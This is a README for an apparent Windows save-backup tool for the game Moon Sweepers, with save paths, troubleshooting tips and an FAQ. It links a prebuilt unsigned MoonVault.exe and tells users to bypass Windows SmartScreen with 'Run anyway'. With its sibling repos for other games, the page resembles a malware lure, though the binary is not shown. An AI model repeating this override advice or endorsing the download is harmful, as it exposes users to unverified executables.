<p align="center">
  <img src="https://i.postimg.cc/SRkjSRV2/banner.png" alt="Moon Sweepers SaveVault — Windows Save Backup and Restore Tool" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Backup%20Utility-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-savevault--nov26--b2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Moon Sweepers SaveVault — save backups and restore on Windows

A long Moon Sweepers session can mean hours of work on your lunar base. Before testing a new patch, joining a different co-op session, moving to another PC or changing Steam Cloud settings, it makes sense to keep a copy of your world files that you control.

**Moon Sweepers SaveVault** is a Windows save-management utility intended for players who want a straightforward way to locate save folders, keep dated backups and restore a chosen copy without guessing which folder to overwrite. It is focused on protecting existing progress rather than modifying the game's economy, achievements or save format.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| 'Save unavailable' or temporary write lock | Antivirus or cloud sync briefly locking `MoonSessions` (improved in 1.0.6) | Update to Patch `1.0.6`+ and keep an offline snapshot outside AppData |
| World missing from the load menu | Wrong Windows profile / Steam account or interrupted cloud sync | Inspect `%USERPROFILE%\AppData\LocalLow\DragDropGames\MoonSweepers` |
| Co-op world fails to load after update | Patch `1.0.6` world saves are not backward-compatible with `1.0.5` | Match host and client game builds and keep pre-update backups |
| Steam Cloud conflict prompt appears | Local and cloud timestamps diverged across sessions | Back up both versions before choosing a resolution in Steam |

## Download

[**Download MoonVault.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/MoonVault.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `MoonVault.exe`? (Automatic checks in ~2 seconds)

- Locates `%USERPROFILE%\AppData\LocalLow\DragDropGames\MoonSweepers\MoonSessions` and built-in `Backups`.
- Creates clean, date-stamped offline backups of your lunar base world folders outside `AppData`.
- Displays file sizes and modification timestamps so you never overwrite a newer save with an older snapshot.
- Operates strictly without modifying save formats or requiring administrator privileges.

### Sample Diagnostic Output

```text
[MoonVault] Scanning Moon Sweepers save & backup directories...
[OK]   Base Directory   : C:\Users\Player\AppData\LocalLow\DragDropGames\MoonSweepers
[OK]   MoonSessions     : 3 active world folders found (Latest: LunarBase_01 - 2.4 MB)
[OK]   Backups Folder   : 8 automatic snapshots detected
[INFO] Integrity Check  : All world files non-empty (> 0 KB)
```

The release archive contains `MoonVault.exe` for Windows. The button links directly to the ZIP asset in the latest GitHub Release.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `MoonVault.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Installation and first run

1. Close **Moon Sweepers** and wait for Steam Cloud synchronization to finish if it is enabled.
2. Click **Download MoonVault.zip** above.
3. Extract the ZIP into a folder of your choice. Avoid running the executable from inside Windows Explorer's ZIP preview.
4. Open `MoonVault.exe`.
5. Choose the folder holding your Moon Sweepers saves, or locate it with the application's folder picker.
6. Make a backup before changing game versions or restoring an older copy.

You do not need to move the original save folder just to make a backup. Store at least one copy somewhere other than the game's active save directory.

## Where Moon Sweepers saves are stored

A commonly reported Windows location is:

```text
%USERPROFILE%\AppData\LocalLow\DragDropGames\MoonSweepers\MoonSessions\
```

Windows hides `AppData` by default. You can paste the path into the File Explorer address bar after replacing environment variables automatically by Windows, or navigate from `%USERPROFILE%` to `AppData\LocalLow`.

The actual location can differ between game builds, Windows users, or future updates. **Check the contents before moving anything.** If the location is empty, do not create fake save files or replace an unrelated folder.

## What SaveVault is intended to help with

### Make a dated backup before an update

Keep a snapshot of each chosen world before installing a patch or changing settings that might affect game state. A good backup includes the complete save folder, not just one file that looks important. Name the backup using the date and the game version so it is easy to identify later.

### Keep track of versions

Moon Sweepers received its 1.0.6 patch in November 2026. Changes to save handling and fixes for temporary save-access failures are listed in the patch notes. A backup manager can record which build you were using when a backup was created, but **a label does not convert saves between versions**.

If you try to load data created by a newer version in an older game build, the game may reject it. Update the game when appropriate and keep the original backup intact.

### Restore a known-good copy

A restore should only be performed after the game is closed, the existing active files have been copied to a safety backup and you have selected the correct world. Restoring an older backup deliberately rolls progress back to that snapshot.

Never restore a snapshot on top of the only remaining copy of your current progress. Steam Cloud may also overwrite local changes after the next launch; check any synchronization conflict prompts carefully.

### Locate missing or apparently empty save folders

If Moon Sweepers shows a missing world, the cause can be a different Windows account, a moved folder, an interrupted cloud sync or a game update. A file-based utility can help inspect local folders; it cannot reconstruct a save that no longer exists anywhere.

## Moon Sweepers save not working? Check these first

**"Save unavailable" or a temporary save failure.** Version 1.0.6 added faster retries for a save briefly held by another application such as security software or cloud synchronization. Check the in-game diagnostics and make sure you are using the current game patch before attempting manual recovery.

**World missing from the game menu.** Check the active Steam account, Windows user and save folder. Look for an existing Steam Cloud copy before overwriting anything. Avoid renaming unknown files until you have a complete backup.

**Save disappeared after changing versions.** Compare the game's build number with the version of the backup. Older builds might not understand data written by newer ones. SaveVault is a backup workflow, not a downgrade converter.

**Steam Cloud asks which files to keep.** Do not click through without reading the timestamps. Preserve copies of both versions first if there is any doubt.

## What this utility does not claim to fix

- It cannot invent missing world data or guarantee that a corrupted file can be repaired.
- It cannot convert save formats between all Moon Sweepers releases.
- It cannot repair the game's servers or restore progress stored only on an unavailable remote account.
- A backup cannot prevent a future bug; it provides an earlier copy to return to.

## FAQ

**Can I use this for a co-op world?**

Back up only the saves you actually control. In co-op, the host may own the active world data. Ask the host to back up their files before making changes.

**Can I use an old save after the 1.0.6 update?**

The result depends on the actual save format and game version. Keep the original and consult the game's current patch notes. Never assume that newer saves can be loaded by older game binaries.

**Do I need administrator access?**

Ordinary per-user save folders should not require administrator privileges. If Windows requests elevated access, first confirm that you selected the correct directory and that another application is not locking it.

**Will it change graphics settings, FPS, or achievement data?**

No such changes are part of this repository's intended save-backup workflow.

## Useful references

- [Moon Sweepers on Steam](https://store.steampowered.com/app/5335510/Moon_Sweepers/)
- [Moon Sweepers 1.0.6 patch notes — November 16, 2026](https://steamdb.info/patchnotes/26682829/)

## More Windows Game Diagnostic Tools

- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 world & dedicated server save backups
- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 co-op world save & `~mods` sentinel
- [Permafrost-SaveGuard](../Permafrost-SaveGuard) — Permafrost `BackupSaves` & `.pfs` world recovery check
- [Dreadmoor-SaveCheck](../Dreadmoor-SaveCheck) — DREADMOOR missing save & progress rollback diagnostics

Independent community project. Not affiliated with DragDrop Games or Valve. Please review the release contents and confirm the tool's behavior on your own save copy before relying on it for important progress.
 
 
 
 
 
 
 
 
